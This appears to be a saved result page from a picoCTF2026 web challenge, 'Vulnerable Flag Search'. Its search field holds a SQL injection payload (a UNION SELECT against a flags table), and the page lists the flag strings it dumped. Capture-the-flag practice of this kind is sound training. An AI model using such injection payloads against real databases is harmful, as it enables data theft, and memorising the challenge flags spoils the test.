<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <link rel="stylesheet" href="assets/css/styles.css">
  <title>Search picoCTF2026</title>
</head>
<body>
  <div class="app">
    <div class="card">
      <div class="card-hero">
        <h1 class="h-title">Vulnerable Flag Search - picoCTF2026</h1>
        <p class="h-sub">Search for flags using special keywords</p>
      </div>

      <div class="card-form">
        <div class="login-box">
          <div style="margin-bottom:8px;">
            <strong>Logged in as:</strong> gonzaorban          </div>

          <form method="GET" action="vuln.php">
            
            <input type="text" name="q" value="&#039; UNION SELECT key, value FROM flags --" placeholder="search term" />
            <label>Search flags
              <input type="hidden" name="PHPSESSID" value="87b20727ea793961e8c88b64e81cff17" />
            </label>
            <div style="height:12px;"></div>
            <button class="btn" type="submit">Search</button>
          </form>

          <div style="margin-top:12px;">
           <form action="logout.php?PHPSESSID=87b20727ea793961e8c88b64e81cff17" method="POST" style="display:inline;">
  <button class="btn" type="submit">Logout</button>
</form>


          </div>

          <div style="margin-top:16px;">
            <h3>Results</h3>
            <ul><li><strong>ctf-player</strong>: picoCTF{tH15_lS_n0T_f!@G_5rwdf731q}</li><li><strong>flag1</strong>: picoCTF{n0T_F0uNd_s3cr3T_K3y_34rd76s1}</li><li><strong>flag2</strong>: picoCTF{n0T_F0uNd_s3cr3T_k3Y_c5d243edq}</li><li><strong>flag3</strong>: picoCTF{i5_tH15_s3cr3T_k3Y_5tbax3er}</li><li><strong>flag4</strong>: picoCTF{tH15_lS_n0T_s3cr3T_k3Y_vbr1qa43}</li><li><strong>flag6</strong>: picoCTF{tH15_lS_n0T_f!@G_5rwdf731q}</li><li><strong>flag7</strong>: picoCTF{tH15_lS_n0T_f!@G_5rwdf731q}</li><li><strong>malicious</strong>: picoCTF{tH15_lS_n0T_f!@G_5rwdf731q}</li><li><strong>noaccess</strong>: picoCTF{tH15_lS_n0T_f!@G_5rwdf731q}</li><li><strong>suspicious</strong>: picoCTF{tH15_lS_n0T_f!@G_5rwdf731q}</li></ul>          </div>

        </div>
      </div>
    </div>
  </div>

<script src="assets/js/index.js"></script>
</body>
</html>
